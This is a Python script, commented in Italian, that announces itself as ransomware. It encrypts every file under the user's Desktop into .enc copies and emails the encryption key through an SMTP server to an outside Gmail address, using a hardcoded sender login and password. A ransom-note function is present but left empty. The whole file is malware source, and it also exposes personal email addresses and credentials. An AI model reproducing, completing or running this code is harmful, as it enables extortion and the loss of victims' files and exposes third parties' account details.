from cryptography.fernet import Fernet
import base64
import os
import secrets
import string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def genera_chiave():
    """Genera una chiave casuale per la cifratura dei
    file e la invia per email a pierobrandola@gmail.com
    """
    lunghezza_c = 32
    caratteri_c = string.ascii_letters + string.digits + string.punctuation + " "
    chiave = ''.join(secrets.choice(caratteri_c) for _ in range(lunghezza_c))

    destinatario = 'pierobrandola@gmail.com'
    mittente = 'acherinoscammini@libero.it'
    oggetto = 'Chiave di cifratura casuale'
    testo_email = f"Ecco la tua chiave di cifratura casuale: {chiave}"
    msg = MIMEMultipart()
    msg['From'] = mittente
    msg['To'] = destinatario
    msg['Subject'] = oggetto

    msg.attach(MIMEText(testo_email, 'plain'))

    server = smtplib.SMTP('smtp.libero.it', 587)
    server.starttls()
    server.login(mittente, 'Password12395@')
    server.sendmail(mittente, destinatario, msg.as_string())
    server.quit()

    return chiave

def cifra_file_singolo(file_path, chiave):
    try:
        # Leggi il contenuto del file
        with open(file_path, 'rb') as file:
            file_data = file.read()

        # Crea un oggetto Fernet con la chiave
        chiave = base64.b64encode(chiave.encode("utf-8"))
        fernet = Fernet(chiave)

        # Cifra i dati del file
        file_cifrato = fernet.encrypt(file_data)

        # Crea il nome del file cifrato
        file_cifrato_path = file_path + '.enc'

        # Scrivi i dati cifrati nel nuovo file
        with open(file_cifrato_path, 'wb') as encrypted_file:
            encrypted_file.write(file_cifrato)

        print(f"File cifrato con successo: {file_cifrato_path}")
    except Exception as e:
        print(f"Si è verificato un errore durante la cifratura del file: {str(e)}")


def cifra_tutti_i_file(chiave):
    try:
        # Ottieni la directory Desktop dell'utente corrente
        desktop_directory = os.path.expanduser("~/Desktop")

        # Itera attraverso tutti i file nella directory Desktop
        for root, dirs, files in os.walk(desktop_directory):
            for file_name in files:
                # Crea il percorso completo del file
                file_path = os.path.join(root, file_name)

                # Verifica se il file è già cifrato
                if not file_path.endswith(".enc"):
                    # Cifra il file solo se non è già cifrato
                    cifra_file_singolo(file_path, chiave)

        print("Cifratura completata con successo per tutti i file nella directory Desktop.")
    except Exception as e:
        print(
            f"Si è verificato un errore durante la cifratura dei file: {str(e)}")

def scrivi_messaggio_minatorio():
    """Scrive un file di testo con la richiesta di
    riscatto sul Desktop dell'utente corrente.
    """
    pass

if __name__ == "__main__":
    print("Benvenuti nel nostro fantastico RANSOMWARE")
    chiave = genera_chiave()
    cifra_tutti_i_file(chiave)
    scrivi_messaggio_minatorio()